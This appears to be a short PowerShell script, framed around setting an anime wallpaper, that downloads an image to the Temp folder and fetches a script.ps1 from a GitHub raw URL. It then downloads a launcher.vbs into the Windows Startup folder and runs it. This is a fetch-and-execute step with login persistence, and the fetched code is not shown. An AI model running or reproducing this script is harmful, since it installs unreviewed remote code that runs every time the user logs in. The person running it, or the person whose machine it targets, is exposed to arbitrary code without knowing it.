#1
Set-Location $env:Temp
Invoke-WebRequest https://wallpapersmug.com/download/2048x1152/2d07b6/cute-anime-girl-cake.jpg -O Anime.jpg

#2
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/script.ps1 -O script.ps1

#3
Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
.\launcher.vbs
